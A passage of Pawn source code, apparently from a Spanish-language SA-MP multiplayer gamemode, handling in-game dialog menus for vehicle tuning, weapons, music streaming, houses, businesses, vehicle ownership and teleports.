				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 2)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),2);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Capa de pintura 3 agregada.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 3)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),3);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Capa de pintura 4 agregada.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 4)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),4);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Capa de pintura 5 agregada.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 5)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1087);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Suspención Hidráulica agregada.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 6)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1081);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Ruedas agregadas.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 7)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1078);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Ruedas agregadas.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 8)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1098);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Ruedas agregadas.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 9)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1074);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Ruedas agregadas.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 10)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1082);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Ruedas agregadas.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 11)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1085);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Ruedas agregadas.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 12)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1025);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Ruedas agregadas.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 13)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				AddVehicleComponent(GetPlayerVehicleID(playerid),1077);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Ruedas agregadas.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
		}
		else ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == Guerra)
    {
		if(response)
		{
			if(listitem == 0)
			{
                GivePlayerWeapon(playerid,38,5000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Minigun!");
			}
			if(listitem == 1)
			{
				GivePlayerWeapon(playerid,35,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Lanza Cohetes!");
			}
			if(listitem == 2)
			{
				GivePlayerWeapon(playerid,37,2500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Lanza Llamas!");
			}
			if(listitem == 3)
			{
				GivePlayerWeapon(playerid,36,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Bazooka!");
			}
			if(listitem == 4)
			{
				GivePlayerWeapon(playerid,16,1000);
		    	SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido {919770}Granadas!");
			}
			if(listitem == 5)
			{
				GivePlayerWeapon(playerid,17,1000);
  	 	 	    SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido {919770}Granadas de humo!");
			}
            if(listitem == 6)
			{
				GivePlayerWeapon(playerid,18,1000);
    	 	 	SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido {919770}Bombas Molotov!");
			}
			if(listitem == 7)
			{
				GivePlayerWeapon(playerid,39,1000);
    	 	 	SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido {919770}Explosivos!");
			}
			if(listitem == 8)
			{
				new LVehicleIDt;
				LVehicleIDt = CarSpawner(playerid,432);
				VehicleInfo[LVehicleIDt][Temp] = 1;
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Rhino!");
			}
			if(listitem == 9)
			{
				new LVehicleIDt;
				LVehicleIDt = CarSpawner(playerid,520);
				VehicleInfo[LVehicleIDt][Temp] = 1;
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Hydra!");
			}
			if(listitem == 10)
			{
				new LVehicleIDt;
				LVehicleIDt = CarSpawner(playerid,447);
				VehicleInfo[LVehicleIDt][Temp] = 1;
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}SeaSparrow!");
			}
			if(listitem == 11)
			{
				new LVehicleIDt;
				LVehicleIDt = CarSpawner(playerid,425);
				VehicleInfo[LVehicleIDt][Temp] = 1;
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Hunter!");
			}
		}
		return 1;
	}
    if(dialogid == Musicall)
    {
		if(response)
		{
 			new Nombre[MAX_PLAYER_NAME];
			GetPlayerName(playerid,Nombre,sizeof(Nombre));
			if(!strlen(inputtext)) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes poner un link.");
			format(string, sizeof(string), "|Info| »{0080FF} %s {EAEAEA}puso una cancion para todos. Usa {C0C0C0}/Dmusica{EAEAEA} si quieres detener la musica.",Nombre);
    		SendClientMessageToAll(red, string);
			for(new i; i < MAX_PLAYERS; i ++)
			{
				PlayAudioStreamForPlayer(i,inputtext);
				Musica = 1;
				Rmusica = SetTimer("ResetMusic", 500000, 1);
			}
		}
	}
	if(dialogid == MenuNegocio)
	{
		if(response)
		{
			if(listitem == 0)ShowPlayerDialog(playerid, MenuNegocio+1, DIALOG_STYLE_LIST, "Menú de negocios (normal)", "{FF0000}*{FFFFFF} Comprar negocio\n{FF0000}*{FFFFFF} Vender negocio\n{FF0000}*{FFFFFF} Ir hacia el negocio\n{FF0000}*{FFFFFF} Recoger ganancias del negocio", "Seleccionar", "Salir");
			if(listitem == 1) cmd_abmenu(playerid,"\1");
		}
	}
	if(dialogid == MenuNegocio+1)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_buybiz(playerid,"\1");
			}
			if(listitem == 1)
			{
				cmd_sellbiz(playerid,"\1");
			}
			if(listitem == 2)
			{
				cmd_gotobiz(playerid,"\1");
			}
			if(listitem == 3)
			{
				cmd_cashbox(playerid,"\1");
			}
		}
		return 1;
	}
	if(dialogid == MenuNegocio+2)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_asellbiz(playerid,"\1");
			}
			if(listitem == 1)
			{
				new nombre[MAX_PLAYER_NAME];
				GetPlayerName(playerid, nombre, sizeof(nombre));
				if(!strcmp(NickPrincipal,nombre,true)){
					cmd_asellallbiz(playerid,"\1");
					//new string[128];
					aresetallbiz();
					fremove(B_FILE_SAVE);
					LoadBusinesses();
					format(string,sizeof(string),"|Info| »{FFFFFF} El administrador {0080FF}%s{FFFFFF} ha reseteado todos los negocios.", pName(playerid));
    				SendClientMessageToAll(red,string);
				}else{
					return SendClientMessage(playerid,red,"|Info| »{FFFFFF}Solo Psicoloco puede usar este comando.");	
				}			
			}
		}
		return 1;
	}
	if(dialogid == MenuCasa)
	{
		if(response)
		{
			if(listitem == 0)ShowPlayerDialog(playerid, MenuCasa+1, DIALOG_STYLE_LIST, "Menú de casas (Normal)", "{FF0000}*{FFFFFF} Propietario\n\n{FF0000}*{FFFFFF} Visitante", "Seleccionar", "Salir");
			if(listitem == 1) cmd_ahmenu(playerid,"\1");
		}
	}
	if(dialogid == MenuCasa+1)
	{
		if(response)
		{
			if(listitem == 0)
			{
				ShowPlayerDialog(playerid, MenuCasa+3, DIALOG_STYLE_LIST, "Menú de casas (Propietario)", "{FF0000}*{FFFFFF} Ir hacia la casa\n{FF0000}*{FFFFFF} Comprar casa\n{FF0000}*{FFFFFF} Vender casa\n{FF0000}*{FFFFFF} Entrar en la casa\n{FF0000}*{FFFFFF} Salir de la casa\n{FF0000}*{FFFFFF} Bloquear Casa\n{FF0000}*{FFFFFF} Desbloquear casa", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				ShowPlayerDialog(playerid, MenuCasa+5, DIALOG_STYLE_LIST, "Menú de casas (Visitante)", "{FF0000}*{FFFFFF} Entrar en la casa\n{FF0000}*{FFFFFF} Salir de la casa\n{FF0000}*{FFFFFF} Comprar casa", "Seleccionar", "Salir");
			}
		}
		return 1;
	}
	if(dialogid == MenuCasa+3)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_gotoh(playerid,"\1");
			}
			if(listitem == 1)
			{
				cmd_buyh(playerid,"\1");
			}
			if(listitem == 2)
			{
				cmd_sellh(playerid,"\1");
			}
			if(listitem == 3)
			{
				cmd_enterh(playerid,"\1");
			}
			if(listitem == 4)
			{
				cmd_exith(playerid,"\1");
			}
			if(listitem == 5)
			{
				cmd_lockh(playerid,"\1");
			}
			if(listitem == 6)
			{
				cmd_unlockh(playerid,"\1");
			}
		}
		return 1;
	}
	if(dialogid == MenuCasa+5)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_enterh(playerid,"\1");
			}
			if(listitem == 1)
			{
				cmd_exith(playerid,"\1");
			}
			if(listitem == 2)
			{
				cmd_buyh(playerid,"\1");
			}
		}
		return 1;
	}
	if(dialogid == MenuCasa+2)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_asellh(playerid,"\1");
			}
			if(listitem == 1)
			{
			    SendClientMessage(playerid, red, "|Info| »{EAEAEA} Este comando ha sido desactivado.");
				/*new Psicoloco[MAX_PLAYER_NAME];
				GetPlayerName(playerid, Psicoloco, sizeof(Psicoloco));
				if( strcmp("Psicoloco", Psicoloco, false) == 0 ) return SendClientMessage(playerid,red,"|Info| »{FFFFFF}Solo Psicoloco puede usar este comando.");
				aresetallhs();
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha reseteado todas las casas. El servidor se reiniciara...", pName(playerid));
				SendClientMessageToAll(red,string);
				cmd_gmx(playerid,"\1");*/
			}
			if(listitem == 2)
			{
				cmd_housesmall(playerid,"\1");
			}
			if(listitem == 3)
			{
				cmd_housemedium(playerid,"\1");
			}
			if(listitem == 4)
			{
				cmd_housemodern(playerid,"\1");
			}
			if(listitem == 5)
			{
				cmd_housemansion(playerid,"\1");
			}
		}
		return 1;
	}
	if(dialogid == MenuVehiculo)
	{
		if(response)
		{
			if(listitem == 0)ShowPlayerDialog(playerid, MenuVehiculo+1, DIALOG_STYLE_LIST, "Menú del vehiculo (Normal)", "{FF0000}*{FFFFFF} Bloquear vehiculo (Temporal)\n{FF0000}*{FFFFFF} Bloquear vehiculo (Permanente)\n\n{FF0000}*{FFFFFF} Desbloquear vehiculo\n{FF0000}*{FFFFFF} Comprar/Vender vehiculo\n{FF0000}*{FFFFFF} Spawnear vehiculos comprados\n{FF0000}*{FFFFFF} Aparcar vehiculo", "Seleccionar", "Salir");
			if(listitem == 1) cmd_avmenu(playerid,"\1");
		}
	}
	if(dialogid == MenuVehiculo+1)
	{
		if(response)
		{
			if(listitem == 0)
			{
				lock(playerid);
			}
			if(listitem == 1)
			{
				securekick(playerid);
			}
			if(listitem == 2)
			{
				unlock(playerid);
			}
			if(listitem == 3)
			{
				ShowPlayerDialog(playerid, MenuVehiculo+5, DIALOG_STYLE_LIST, "Comprar/Vender vehiculo", "{FF0000}*{FFFFFF} Comprar\n{FF0000}*{FFFFFF} Vender", "Seleccionar", "Salir");
			}
			if(listitem == 4)
			{
				ShowPlayerDialog(playerid, MenuVehiculo+6, DIALOG_STYLE_LIST, "Spawnear vehiculos comprados", "{FF0000}*{FFFFFF} #1\n{FF0000}*{FFFFFF} #2\n{FF0000}*{FFFFFF} #3\n{FF0000}*{FFFFFF} #4\n{FF0000}*{FFFFFF} #5\n{FF0000}*{FFFFFF} #6\n{FF0000}*{FFFFFF} #7\n{FF0000}*{FFFFFF} #8\n{FF0000}*{FFFFFF} #9\n{FF0000}*{FFFFFF} #10", "Seleccionar", "Salir");
			}
			if(listitem == 5)
			{
				if(GetPlayerMoney(playerid)<=10000) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener {52C433}$10.000{EAEAEA} para poder aparcar tu vehiculo.");
				GivePlayerMoney(playerid, -10000);
				park(playerid);
			}
		}
		return 1;
	}
	if(dialogid == MenuVehiculo+5)
	{
		if(response)
		{
			if(listitem == 0)
			{
				buycar(playerid);
			}
			if(listitem == 1)
			{
				sellcar(playerid);
			}
		}
		return 1;
	}
	if(dialogid == MenuVehiculo+6)
	{
		if(response)
		{
			if(listitem == 0)
			{
				callcar(playerid);
			}
			if(listitem == 1)
			{
				callcar2(playerid);
			}
			if(listitem == 2)
			{
				callcar3(playerid);
			}
			if(listitem == 3)
			{
				callcar4(playerid);
			}
			if(listitem == 4)
			{
				callcar5(playerid);
			}
			if(listitem == 5)
			{
				callcar6(playerid);
			}
			if(listitem == 6)
			{
				callcar7(playerid);
			}
			if(listitem == 7)
			{
				callcar8(playerid);
			}
			if(listitem == 8)
			{
				callcar9(playerid);
			}
			if(listitem == 9)
			{
				callcar10(playerid);
			}
		}
		return 1;
	}
	if(dialogid == MenuVehiculo+2)
	{
		if(response)
		{
			if(listitem == 0)
			{
				asellcar(playerid);
			}
			if(listitem == 1)
			{
				ShowPlayerDialog(playerid, MenuVehiculo+7, DIALOG_STYLE_LIST, "Establecer el estado de compra", "{FF0000}*{FFFFFF} En venta\n{FF0000}*{FFFFFF} Quitar venta", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				ShowPlayerDialog(playerid, MenuVehiculo+8, DIALOG_STYLE_LIST, "Bloquear vehiculo (Admin)", "{FF0000}*{FFFFFF} Activar bloqueo de admin\n{FF0000}*{FFFFFF} Desactivar bloqueo de admin", "Seleccionar", "Salir");
			}
			if(listitem == 3)
			{
				apark(playerid);
			}
			if(listitem == 4)
			{
				aresetcar(playerid);
				SendClientMessageToAll(red, "|Info| »{EAEAEA} Vehiculo reseteado.");
			}
			if(listitem == 5)
			{
			    SendClientMessage(playerid, red, "|Info| »{EAEAEA} Este comando ha sido desactivado.");
				/*new Psicoloco[MAX_PLAYER_NAME];
				GetPlayerName(playerid, Psicoloco, sizeof(Psicoloco));
				if( strcmp("Psicoloco", Psicoloco, true) == 0 ) return SendClientMessage(playerid,red,"|Info| »{FFFFFF}Solo Psicoloco puede usar este comando.");
				aresetallcar();
				fremove(V_FILE_SAVE);
				LoadVehicles();
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha reseteado todos los vehiculos.", pName(playerid));
				SendClientMessageToAll(red,string);*/
			}
		}
		return 1;
	}
	if(dialogid == MenuVehiculo+7)
	{
		if(response)
		{
			if(listitem == 0)
			{
				setbuy(playerid);
			}
			if(listitem == 1)
			{
				setunbuy(playerid);
			}
		}
		return 1;
	}
	if(dialogid == MenuVehiculo+8)
	{
		if(response)
		{
			if(listitem == 0)
			{
				ShowPlayerDialog(playerid, MenuVehiculo+9, DIALOG_STYLE_LIST, "Activar bloqueo de admin", "{FF0000}*{FFFFFF} Bloqueo letal (Mata al jugador)\n{FF0000}*{FFFFFF} Bloqueo no letal (Expulsa al jugador)", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				aunsecure(playerid);
			}
		}
		return 1;
	}
	if(dialogid == MenuVehiculo+9)
	{
		if(response)
		{
			if(listitem == 0)
			{
				asecurekill(playerid);
			}
			if(listitem == 1)
			{
				asecurekick(playerid);
			}
		}
		return 1;
	}
   	if(dialogid == Teles)
	{
		if(response)
		{
			if(listitem == 0)ShowPlayerDialog(playerid, Teles+1, DIALOG_STYLE_LIST, "Ciudades y Aeropuertos", "{FF0000}*{FFFFFF} Los Santos\n{FF0000}*{FFFFFF} San Fierro\n{FF0000}*{FFFFFF} Las Venturas\n{FF0000}*{FFFFFF} Liberty City\n{FF0000}*{FFFFFF} Aeropuerto de Los Santos\n{FF0000}*{FFFFFF} Aeropuerto de San Fierro\n{FF0000}*{FFFFFF} Aeropuerto de Las Venturas\n{FF0000}*{FFFFFF} Aeropuerto Abandonado", "Seleccionar", "Atras");
			if(listitem == 1)ShowPlayerDialog(playerid, Teles+2, DIALOG_STYLE_LIST, "Deathmatchs", "{FF0000}*{FFFFFF} Deathmatch 1\n{FF0000}*{FFFFFF} Deathmatch 2\n{FF0000}*{FFFFFF} Deathmatch 3\n{FF0000}*{FFFFFF} Deathmatch 4\n{FF0000}*{FFFFFF} Mini DM\n{FF0000}*{FFFFFF} Mini DM 2\n{FF0000}*{FFFFFF} Minigun DM\n{FF0000}*{FFFFFF} Sniper DM\n{FF0000}*{FFFFFF} Boxeo DM\n{FF0000}*{FFFFFF} Pro DM\n{FF0000}*{FFFFFF} Guerra DM\n{FF0000}*{FFFFFF} Desmadre", "Seleccionar", "Atras");
			if(listitem == 2)ShowPlayerDialog(playerid, Teles+3, DIALOG_STYLE_LIST, "Parkours", "{FF0000}*{FFFFFF} Parkour 1\n{FF0000}*{FFFFFF} Parkour 2\n{FF0000}*{FFFFFF} Parkour 3\n{FF0000}*{FFFFFF} Parkour 4\n{FF0000}*{FFFFFF} Parkour 5\n{FF0000}*{FFFFFF} Parkour 6\n{FF0000}*{FFFFFF} Parkour NRG1\n{FF0000}*{FFFFFF} Parkour NRG2\n{FF0000}*{FFFFFF} Parkour Monster1\n{FF0000}*{FFFFFF} Parkour Monster2\n{FF0000}*{FFFFFF} Parkour Monster3", "Seleccionar", "Atras");
			if(listitem == 3)ShowPlayerDialog(playerid, Teles+4, DIALOG_STYLE_LIST, "Paracaidismos", "{FF0000}*{FFFFFF} Salto Mortal 1\n{FF0000}*{FFFFFF} Salto Mortal 2\n{FF0000}*{FFFFFF} Salto Mortal 3\n{FF0000}*{FFFFFF} Salto Mortal 4\n{FF0000}*{FFFFFF} Super Salto 1\n{FF0000}*{FFFFFF} Super Salto 2\n{FF0000}*{FFFFFF} Super Salto 3\n{FF0000}*{FFFFFF} Super Salto 4\n{FF0000}*{FFFFFF} Super Salto 5", "Seleccionar", "Atras");
			if(listitem == 4)ShowPlayerDialog(playerid, Teles+5, DIALOG_STYLE_LIST, "Lugares", "{FF0000}*{FFFFFF} Grove Street\n{FF0000}*{FFFFFF} Cementerio\n{FF0000}*{FFFFFF} Playa\n{FF0000}*{FFFFFF} Bike Park\n{FF0000}*{FFFFFF} Mansion de Madd Dogg\n{FF0000}*{FFFFFF} Area 51\n{FF0000}*{FFFFFF} Monte Chiliad\n{FF0000}*{FFFFFF} Club de Jizzy\n{FF0000}*{FFFFFF} Torre\n{FF0000}*{FFFFFF} MotoTrial\n{FF0000}*{FFFFFF} Drift", "Seleccionar", "Atras");
			if(listitem == 5)ShowPlayerDialog(playerid, Teles+6, DIALOG_STYLE_LIST, "Rampas", "{FF0000}*{FFFFFF} Rampa Mortal 1\n{FF0000}*{FFFFFF} Rampa Mortal 2\n{FF0000}*{FFFFFF} Rampa Mortal 3\n{FF0000}*{FFFFFF} Super Rampa", "Seleccionar", "Atras");
			if(listitem == 6)ShowPlayerDialog(playerid, Teles+7, DIALOG_STYLE_LIST, "Garaje Tuning", "{FF0000}*{FFFFFF} Garaje Tuning 1\n{FF0000}*{FFFFFF} Garaje Tuning 2\n{FF0000}*{FFFFFF} Garaje Tuning 3\n{FF0000}*{FFFFFF} Garaje Tuning 4\n{FF0000}*{FFFFFF} Garaje Tuning 5", "Seleccionar", "Atras");
		}
	}
	if(dialogid == Teles+1)
	{
		if(response)
		{
			if(listitem == 0)
			{
				AntiFlood[playerid] = false;
				cmd_ls(playerid,"\1");
			}
			if(listitem == 1)
			{
				AntiFlood[playerid] = false;
				cmd_sf(playerid,"\1");
			}
			if(listitem == 2)
			{
				AntiFlood[playerid] = false;
				cmd_lv(playerid,"\1");
			}
			if(listitem == 3)
			{
				AntiFlood[playerid] = false;
				cmd_lc(playerid,"\1");
			}
			if(listitem == 4)
			{
				AntiFlood[playerid] = false;
				cmd_lsa(playerid,"\1");
			}
			if(listitem == 5)
			{
				AntiFlood[playerid] = false;
				cmd_sfa(playerid,"\1");
			}
			if(listitem == 6)
			{
